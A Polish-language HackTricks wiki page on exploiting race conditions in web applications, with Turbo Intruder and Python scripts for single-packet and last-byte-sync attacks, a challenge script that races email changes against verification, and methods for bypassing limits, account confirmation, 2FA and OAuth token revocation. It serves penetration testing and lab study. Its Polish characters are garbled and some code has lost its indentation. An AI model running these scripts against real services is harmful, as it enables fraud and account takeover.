# Warunki Wycigu

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

{% hint style="warning" %}
Aby uzyska gbokie zrozumienie tej techniki, sprawd藕 oryginalny raport w [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Zwikszanie Atak贸w Warunk贸w Wycigu

G贸wn przeszkod w wykorzystaniu warunk贸w wycigu jest upewnienie si, 偶e wiele 偶da jest obsugiwanych jednoczenie, z **bardzo ma r贸偶nic w czasie ich przetwarzaniaidealnie, mniej ni偶 1ms**.

Tutaj znajdziesz kilka technik synchronizacji 偶da:

#### Atak HTTP/2 z pojedynczym pakietem vs. Synchronizacja ostatniego bajtu HTTP/1.1

* **HTTP/2**: Obsuguje wysyanie dw贸ch 偶da przez jedno poczenie TCP, co zmniejsza wpyw jittera sieciowego. Jednak z powodu r贸偶nic po stronie serwera, dwa 偶dania mog nie wystarczy do sp贸jnego wykorzystania warunk贸w wycigu.
* **HTTP/1.1 'Synchronizacja Ostatniego Bajtu'**: Umo偶liwia wstpne wysyanie wikszoci czci 20-30 偶da, wstrzymujc may fragment, kt贸ry jest nastpnie wysyany razem, osigajc jednoczesne dotarcie do serwera.

**Przygotowanie do Synchronizacji Ostatniego Bajtu** obejmuje:

1. Wysyanie nag贸wk贸w i danych ciaa bez ostatniego bajtu bez koczenia strumienia.
2. Wstrzymanie na 100ms po pocztkowym wysaniu.
3. Wyczenie TCP\_NODELAY, aby wykorzysta algorytm Nagle'a do grupowania ostatnich ramek.
4. Pingowanie w celu rozgrzania poczenia.

Nastpne wysanie wstrzymanych ramek powinno skutkowa ich dotarciem w jednym pakiecie, co mo偶na zweryfikowa za pomoc Wireshark. Ta metoda nie dotyczy plik贸w statycznych, kt贸re zazwyczaj nie s zaanga偶owane w ataki RC.

### Dostosowanie do Architektury Serwera

Zrozumienie architektury celu jest kluczowe. Serwery front-end mog r贸偶nie kierowa 偶dania, co wpywa na czas. Wstpne rozgrzewanie poczenia po stronie serwera, poprzez nieistotne 偶dania, mo偶e znormalizowa czas 偶da.

#### Obsuga Blokowania Opartego na Sesji

Frameworki takie jak handler sesji PHP serializuj 偶dania wedug sesji, co mo偶e zaciemnia luki. Wykorzystanie r贸偶nych token贸w sesji dla ka偶dego 偶dania mo偶e obej ten problem.

#### Pokonywanie Ogranicze Czstotliwoci lub Zasob贸w

Jeli rozgrzewanie poczenia jest nieskuteczne, celowe wywoanie op贸藕nie ogranicze czstotliwoci lub zasob贸w serwer贸w WWW poprzez zalewanie ich faszywymi 偶daniami mo偶e uatwi atak z pojedynczym pakietem, wywoujc op贸藕nienie po stronie serwera sprzyjajce warunkom wycigu.

## Przykady Atak贸w

* **Tubo Intruder - atak HTTP2 z pojedynczym pakietem (1 punkt kocowy)**: Mo偶esz wysa 偶danie do **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), mo偶esz zmieni w 偶daniu warto, kt贸r chcesz zama dla **`%s`** jak w `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` i nastpnie wybra **`examples/race-single-packer-attack.py`** z rozwijanej listy:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Jeli zamierzasz **wysa r贸偶ne wartoci**, mo偶esz zmodyfikowa kod tym, kt贸ry u偶ywa listy s贸w z schowka:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Jeli strona internetowa nie obsuguje HTTP2 (tylko HTTP1.1), u偶yj `Engine.THREADED` lub `Engine.BURP` zamiast `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - atak pojedynczym pakietem HTTP2 (Kilka punkt贸w kocowych)**: W przypadku, gdy musisz wysa 偶danie do 1 punktu kocowego, a nastpnie wiele do innych punkt贸w kocowych, aby wywoa RCE, mo偶esz zmieni skrypt `race-single-packet-attack.py` na co takiego:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Jest r贸wnie偶 dostpne w **Repeater** za pomoc nowej opcji '**Wylij grup r贸wnolegle**' w Burp Suite.
* Dla **limit-overrun** mo偶esz po prostu doda **ten sam 偶danie 50 razy** w grupie.
* Dla **connection warming** mo偶esz **doda** na **pocztku** **grupy** kilka **偶da** do nie statycznej czci serwera webowego.
* Aby **op贸藕ni** proces **midzy** przetwarzaniem **jednego 偶dania a drugim** w 2 krokach substanu, mo偶esz **doda dodatkowe 偶dania midzy** obydwoma 偶daniami.
* Dla **multi-endpoint** RC mo偶esz zacz wysya **偶danie**, kt贸re **przechodzi do ukrytego stanu**, a nastpnie **50 偶da** tu偶 po nim, kt贸re **wykorzystuj ukryty stan**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Zautomatyzowany skrypt python**: Celem tego skryptu jest zmiana adresu e-mail u偶ytkownika, jednoczenie weryfikujc go, a偶 token weryfikacyjny nowego e-maila dotrze do ostatniego e-maila (to dlatego, 偶e w kodzie widziano RC, gdzie mo偶liwe byo modyfikowanie e-maila, ale weryfikacja bya wysyana na stary, poniewa偶 zmienna wskazujca na e-mail bya ju偶 wypeniona pierwszym).\
Gdy sowo "objetivo" zostanie znalezione w otrzymanych e-mailach, wiemy, 偶e otrzymalimy token weryfikacyjny zmienionego e-maila i koczymy atak.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Poprawa Ataku Pojedynczego Pakietu

W oryginalnych badaniach wyjaniono, 偶e ten atak ma limit 1,500 bajt贸w. Jednak w [**tym pocie**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) wyjaniono, jak mo偶liwe jest rozszerzenie ograniczenia 1,500 bajt贸w ataku pojedynczego pakietu do **65,535 B ograniczenia okna TCP poprzez u偶ycie fragmentacji na poziomie IP** (dzielenie pojedynczego pakietu na wiele pakiet贸w IP) i wysyanie ich w r贸偶nej kolejnoci, co pozwolio zapobiec ponownemu zo偶eniu pakietu, a偶 wszystkie fragmenty dotr do serwera. Ta technika pozwolia badaczowi wysa 10,000 偶da w okoo 166 ms.&#x20;

Zauwa偶, 偶e chocia偶 ta poprawa sprawia, 偶e atak jest bardziej niezawodny w RC, kt贸ry wymaga, aby setki/tysice pakiet贸w dotary w tym samym czasie, mo偶e r贸wnie偶 mie pewne ograniczenia programowe. Niekt贸re popularne serwery HTTP, takie jak Apache, Nginx i Go, maj surowe ustawienie `SETTINGS_MAX_CONCURRENT_STREAMS` na 100, 128 i 250. Jednak inne, takie jak NodeJS i nghttp2, maj to ustawienie nieograniczone.\
To zasadniczo oznacza, 偶e Apache we藕mie pod uwag tylko 100 pocze HTTP z jednego poczenia TCP (ograniczajc ten atak RC).

Mo偶esz znale藕 kilka przykad贸w u偶ywajcych tej techniki w repozytorium [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Surowy BF

Przed wczeniejszymi badaniami u偶ywano kilku adunk贸w, kt贸re po prostu pr贸boway wysa pakiety tak szybko, jak to mo偶liwe, aby spowodowa RC.

* **Repeater:** Sprawd藕 przykady z poprzedniej sekcji.
* **Intruder**: Wylij **偶danie** do **Intruder**, ustaw **liczb wtk贸w** na **30** w **menu Opcje** i wybierz jako adunek **Null payloads** i wygeneruj **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodologia**

### Limit-overrun / TOCTOU

To jest najprostszy typ warunk贸w wycigu, gdzie **luki** pojawiaj si w miejscach, kt贸re **ograniczaj liczb razy, kiedy mo偶esz wykona akcj**. Na przykad u偶ywanie tego samego kodu rabatowego w sklepie internetowym kilka razy. Bardzo atwy przykad mo偶na znale藕 w [**tym raporcie**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) lub w [**tym bdzie**](https://hackerone.com/reports/759247)**.**

Istnieje wiele wariant贸w tego rodzaju ataku, w tym:

* Wykorzystywanie karty podarunkowej wiele razy
* Ocena produktu wiele razy
* Wypacanie lub transferowanie got贸wki przekraczajcej saldo konta
* Ponowne u偶ycie jednego rozwizania CAPTCHA
* Ominicie limitu szybkoci anty-brute-force

### **Ukryte podstany**

Wykorzystywanie zo偶onych warunk贸w wycigu czsto polega na wykorzystaniu kr贸tkich okazji do interakcji z ukrytymi lub **niezamierzonymi podstanami maszyny**. Oto jak podej do tego:

1. **Zidentyfikuj potencjalne ukryte podstany**
* Zacznij od wskazania punkt贸w kocowych, kt贸re modyfikuj lub interaguj z krytycznymi danymi, takimi jak profile u偶ytkownik贸w lub procesy resetowania hasa. Skup si na:
* **Przechowywaniu**: Preferuj punkty kocowe, kt贸re manipuluj danymi trwaymi po stronie serwera, zamiast tych obsugujcych dane po stronie klienta.
* **Akcji**: Szukaj operacji, kt贸re zmieniaj istniejce dane, kt贸re s bardziej prawdopodobne do stworzenia warunk贸w do wykorzystania w por贸wnaniu do tych, kt贸re dodaj nowe dane.
* **Kluczowaniu**: Udane ataki zazwyczaj obejmuj operacje kluczowane na tym samym identyfikatorze, np. nazwa u偶ytkownika lub token resetowania.
2. **Przeprowad藕 wstpne badania**
* Testuj zidentyfikowane punkty kocowe za pomoc atak贸w warunk贸w wycigu, obserwujc wszelkie odchylenia od oczekiwanych wynik贸w. Nieoczekiwane odpowiedzi lub zmiany w zachowaniu aplikacji mog sygnalizowa luk.
3. **Zademonstruj luk**
* Zaw偶 atak do minimalnej liczby 偶da potrzebnych do wykorzystania luki, czsto tylko dw贸ch. Ten krok mo偶e wymaga wielu pr贸b lub automatyzacji z powodu precyzyjnego czasu.

### Ataki wra偶liwe na czas

Precyzja w czasowaniu 偶da mo偶e ujawni luki, szczeg贸lnie gdy przewidywalne metody, takie jak znaczniki czasu, s u偶ywane do token贸w zabezpieczajcych. Na przykad generowanie token贸w resetowania hasa na podstawie znacznik贸w czasu mo偶e pozwoli na identyczne tokeny dla r贸wnoczesnych 偶da.

**Aby wykorzysta:**

* U偶yj precyzyjnego czasowania, jak atak jednego pakietu, aby zo偶y r贸wnoczesne 偶dania resetowania hasa. Identyczne tokeny wskazuj na luk.

**Przykad:**

* Z贸偶 dwa 偶dania token贸w resetowania hasa w tym samym czasie i por贸wnaj je. Pasujce tokeny sugeruj bd w generowaniu token贸w.

**Sprawd藕 to** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **aby to wypr贸bowa.**

## Przypadki u偶ycia ukrytych podstan贸w

### Zapa i dodaj przedmiot

Sprawd藕 to [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), aby zobaczy, jak **zapaci** w sklepie i **doda dodatkowy** przedmiot, za kt贸ry **nie bdziesz musia paci**.

### Potwierd藕 inne e-maile

Pomys polega na **zweryfikowaniu adresu e-mail i jednoczesnej zmianie go na inny**, aby sprawdzi, czy platforma weryfikuje nowy zmieniony adres.

### Zmie e-mail na 2 adresy e-mail oparte na ciasteczkach

Zgodnie z [**tym badaniem**](https://portswigger.net/research/smashing-the-state-machine) Gitlab by podatny na przejcie w ten spos贸b, poniewa偶 m贸g **wysa** **token weryfikacji e-maila jednego e-maila do drugiego e-maila**.

**Sprawd藕 to** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **aby to wypr贸bowa.**

### Ukryte stany bazy danych / Ominicie potwierdzenia

Jeli **u偶ywane s 2 r贸偶ne zapisy**, aby **doda** **informacje** do **bazy danych**, istnieje kr贸tki okres czasu, w kt贸rym **tylko pierwsze dane zostay zapisane** w bazie danych. Na przykad, podczas tworzenia u偶ytkownika **nazwa u偶ytkownika** i **haso** mog by **zapisane**, a **nastpnie zapisany jest token** do potwierdzenia nowo utworzonego konta. Oznacza to, 偶e przez kr贸tki czas **token do potwierdzenia konta jest pusty**.

Dlatego **rejestrowanie konta i wysyanie kilku 偶da z pustym tokenem** (`token=` lub `token[]=` lub jakakolwiek inna wariacja) do natychmiastowego potwierdzenia konta mo偶e pozwoli na **potwierdzenie konta**, nad kt贸rym nie masz kontroli nad e-mailem.

**Sprawd藕 to** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **aby to wypr贸bowa.**

### Ominicie 2FA

Poni偶szy pseudokod jest podatny na warunki wycigu, poniewa偶 w bardzo kr贸tkim czasie **2FA nie jest egzekwowane**, podczas gdy sesja jest tworzona:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 wieczna trwao

Istnieje kilka [**dostawc贸w OAUth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Te usugi pozwalaj na stworzenie aplikacji i uwierzytelnienie u偶ytkownik贸w, kt贸rych dostawca zarejestrowa. Aby to zrobi, **klient** musi **zezwoli twojej aplikacji** na dostp do niekt贸rych swoich danych w ramach **dostawcy OAUth**.\
Do tego momentu to tylko zwyke logowanie za pomoc google/linkedin/github... gdzie pojawia si strona z komunikatem: "_Aplikacja \<InsertCoolName> chce uzyska dostp do twoich informacji, czy chcesz to umo偶liwi?_"

#### Warunki wycigu w `authorization_code`

**Problem** pojawia si, gdy **zaakceptujesz to** i automatycznie wysya **`authorization_code`** do zoliwej aplikacji. Nastpnie ta **aplikacja nadu偶ywa Warunku Wycigu w usudze OAUth, aby wygenerowa wicej ni偶 jeden AT/RT** (_Token Uwierzytelniajcy/Token Odwie偶ajcy_) z **`authorization_code`** dla twojego konta. W zasadzie nadu偶yje faktu, 偶e zaakceptowae aplikacj, aby uzyska dostp do swoich danych, aby **utworzy kilka kont**. Nastpnie, jeli **przestaniesz zezwala aplikacji na dostp do swoich danych, jedna para AT/RT zostanie usunita, ale pozostae bd nadal wa偶ne**.

#### Warunki wycigu w `Refresh Token`

Gdy **uzyskasz wa偶ny RT**, mo偶esz spr贸bowa **nadu偶y go, aby wygenerowa kilka AT/RT**, a **nawet jeli u偶ytkownik anuluje uprawnienia** dla zoliwej aplikacji do uzyskania dostpu do jego danych, **kilka RT nadal bdzie wa偶nych.**

## **RC w WebSockets**

W [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) mo偶esz znale藕 PoC w Javie do wysyania wiadomoci websocket w **r贸wnolegych** w celu nadu偶ycia **Warunk贸w Wycigu r贸wnie偶 w Web Sockets**.

## Referencje

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
* [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
